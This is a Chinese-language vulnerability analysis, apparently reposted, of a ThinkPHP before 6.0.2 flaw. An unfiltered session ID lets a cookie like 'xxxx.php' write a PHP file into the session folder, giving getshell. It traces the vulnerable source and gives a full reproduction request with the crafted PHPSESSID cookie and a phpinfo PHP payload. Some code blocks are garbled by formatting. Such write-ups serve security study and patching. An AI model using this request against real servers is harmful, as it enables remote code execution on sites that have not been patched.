# Thinkphp < 6.0.2 session id未作过滤导致getshell

> 原文：[https://www.zhihuifly.com/t/topic/3172](https://www.zhihuifly.com/t/topic/3172)

# Thinkphp < 6.0.2 session id未作过滤导致getshell

## 一、漏洞简介

## 二、漏洞影响

Thinkphp < 6.0.2

## 三、复现过程

### 漏洞分析

通过diff github上面的6.0.1和6.0.2的代码可以发现，6.0.1在设置`session id`时未对值进行`ctype_alnum()`校验，从而导致可以传入任意字符。

![image](img/f7adddb9a067a21b6703f00e65eb4d94.png)

传入任意字符会有什么危害？一般来说程序可能会以session id作为文件名来创建对应的session文件，但是到目前为止这只是猜测。看一下保存session是怎么写的。

```
public function save(): void
{
    $this->clearFlashData();

```
$sessionId = $this-&gt;getId();

if (!empty($this-&gt;data)) {
    $data = $this-&gt;serialize($this-&gt;data);

    $this-&gt;handler-&gt;write($sessionId, $data);
} else {
    $this-&gt;handler-&gt;delete($sessionId);
}

$this-&gt;init = false; 
``` `}` 
```

先获取sessionid，然后作为第一个参数传入`$this->handler->write()`。`$this->handler`在构造函数中被初始化

```
public function __construct($name, SessionHandlerInterface $handler, array $serialize = null)
{
    $this->name    = $name;
    $this->handler = $handler;

```
if (!empty($serialize)) {
    $this-&gt;serialize = $serialize;
}

$this-&gt;setId(); 
``` `}` 
```

可以看出`$handler`的类型是`SessionHandlerInterface`，全局发现这是一个接口，实现这个接口的类有两个，一个是`File`，一个是`Cache`。这里以`File`类为例，我们跟进它的`write()`方法

```
public function write(string $sessID, string $sessData): bool
{
    $filename = $this->getFileName($sessID, true);
    $data     = $sessData;

```
if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) {
    //数据压缩
    $data = gzcompress($data, 3);
}

return $this-&gt;writeFile($filename, $data); 
``` `}` 
```

这里先通过第一个参数（也就是session id）来构造`$filename`，然后判断是否需要对session数据进行压缩，默认是不需要的，最后return时调用`$this->writeFile()`。先看看文件名是如何构造的，跟进`$this->getFileName()`

```
protected function getFileName(string $name, bool $auto = false): string
{
    if ($this->config['prefix']) {
        $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
    } else {
        $name = 'sess_' . $name;
    }

```
$filename = $this-&gt;config['path'] . $name;
...
return $filename; 
``` `}` 
```

这里直接将第一个参数拼接到路径的最后。跟进之前的`$this->writeFile()`方法

```
protected function writeFile($path, $content): bool
{
    return (bool) file_put_contents($path, $content, LOCK_EX);
} 
```

刺激了，这里直接保存了文件。纵观全局，由于程序未对session id进行危险字符判断，只要将session id写为类似于`xxxx.php`的格式，即可导致session保存成`.php`文件，从而getshell。

### 漏洞复现

通过全局搜索`setId`发现在`think/middleware/SessionInit.php:handle():L59`发生了调用。

```
public function handle($request, Closure $next)
{
    // Session初始化
    $varSessionId = $this->app->config->get('session.var_session_id');
    $cookieName   = $this->session->getName();

```
if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
    $sessionId = $request-&gt;request($varSessionId);
} else {
    $sessionId = $request-&gt;cookie($cookieName);
}

if ($sessionId) {
    $this-&gt;session-&gt;setId($sessionId);
}
... 
``` 
```

由于`session.var_session_id`默认是空，这里的`$sessionId`的值由`$request->cookie($cookieName)`获得，`$cookieName`经过跟进后发现默认是PHPSESSID。

![image](img/eb8ceb9f32c8f3c2034b2559f2fd33ab.png)

因此我们只要设置Cookie中的PHPSESSID的值为1234567890123456789012345678.php即可。

我们在index控制器中添加如下action

```
public function testsession2(){
    $username = Request::get('name');
    Session::set('username', $username);
    return 'hi';
} 
```

用于获取name参数，并将之设置到session中。

根据控制器构造数据包

注意 session PHPSESSID= 后面要按照要求必须 32位 可以随便构造!!!

```
POST /tp6/public/index.php/index/test1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/tp6/public/index.php/index/test1
Cookie: PHPSESSID=1234567890123456789012345678.php; 
Upgrade-Insecure-Requests: 1 `key=<?php%20phpinfo();?>` 
```

访问url：`http://127.0.0.1/tp6/public/index.php/index/testsession2?name=`

![image](img/81509c2dc324614813bb7b4d540278fb.png)

访问session文件，一般位于项目根目录下的`./runtime/session/`文件夹下，也就是`/runtime/session/sess_1234567890123456789012345678.php`

![image](img/d009828d27f683e8d4680faa96be2875.png)

## 参考链接

> https://xz.aliyun.com/t/7109